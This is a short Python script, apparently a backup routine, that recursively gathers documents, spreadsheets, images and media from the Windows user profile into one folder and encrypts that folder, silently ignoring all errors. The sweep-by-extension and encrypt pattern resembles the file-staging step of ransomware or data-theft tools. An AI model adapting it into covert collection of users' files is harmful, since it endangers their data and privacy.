import glob, os
import shutil
from pathlib import Path
import os, stat
from encryption.encryption_manager import encrypt_folder

backup_file_types = [".doc",".docx", ".odt", ".pdf", ".xls", 
                    ".xlsx", ".ods", ".ppt", ".pptx", ".txt", 
                    ".jpg", ".jpeg", ".gif", ".png", ".mp3", ".mp4"]

exclude = ["AppData"]

def init_backup_routine(destination, reserved):
    exclude.append(destination)
    try:
        for filename in glob.iglob(os.environ["userprofile"] + "/**", recursive=True):
            if os.path.isfile(filename):
                if Path(filename).suffix.lower() in backup_file_types and not is_path_excluded(filename):
                    shutil.copy(filename, destination + "/")
                    encrypt_folder(destination, None)
    except Exception as e:
        return


def is_path_excluded(filepath):
    for i in exclude:
        if i in filepath:
            return True
    return False
